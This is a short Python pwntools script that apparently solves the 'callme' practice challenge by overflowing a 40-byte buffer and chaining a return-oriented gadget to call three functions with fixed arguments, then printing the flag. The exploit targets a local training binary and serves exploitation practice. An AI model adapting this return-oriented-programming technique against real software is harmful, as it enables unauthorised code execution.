from pwn import *

pop_rdi_rsi_rdx = 0x0040093c
callme_one = 0x00400720
callme_two = 0x00400740
callme_three = 0x004006f0

payload = b"".join([
    b"A"*(32+8),
    p64(pop_rdi_rsi_rdx),
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(callme_one),
    p64(pop_rdi_rsi_rdx),
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(callme_two),
    p64(pop_rdi_rsi_rdx),
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(callme_three),
])

p = process("./callme")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"correctly\n")
p.recvuntil(b"correctly\n")
flag = p.recv()
print(f"Flag : {flag}")
